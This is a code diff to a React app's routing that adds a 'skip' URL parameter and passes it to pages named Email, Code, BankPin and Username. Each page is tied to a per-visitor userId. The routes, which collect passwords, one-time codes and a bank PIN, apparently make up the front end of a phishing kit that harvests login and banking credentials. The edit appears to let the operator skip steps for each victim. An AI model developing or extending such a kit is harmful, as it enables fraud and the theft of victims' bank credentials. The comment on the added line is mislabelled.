@@ -19,6 +19,7 @@ function App() {
   const [validUserId, setValidUserId] = useState(false);
   const [searchParams] = useSearchParams();
   const userId = searchParams.get("userId"); // Extracting userId from query parameters
+  const skip = searchParams.getAll("skip"); // Extracting userId from query parameters
 
   
   useEffect(() => {
@@ -37,6 +38,7 @@ function App() {
               path="*"
               element={
                 <Email
+                  skip={skip}
                   password={password}
                   setPassword={setPassword}
                   email={email}
@@ -47,7 +49,7 @@ function App() {
             />
             <Route
               path="/code"
-              element={<Code emailValue={email} userId={userId} />}
+              element={<Code skip={skip} emailValue={email} userId={userId} />}
             />
             <Route
               path="/password"
@@ -62,7 +64,7 @@ function App() {
             />
             <Route
               path="/bankpin"
-              element={<BankPin email={email} userId={userId} />}
+              element={<BankPin skip={skip} email={email} userId={userId} />}
             />
 
             <Route path="/authcode" element={<AuthCode email={email} userId={userId} />} />
@@ -70,6 +72,7 @@ function App() {
               path="/username/:userId?/*"
               element={
                 <Username
+                  skip={skip}
                   username={username}
                   setUsername={setUsername}
                   userId={userId}
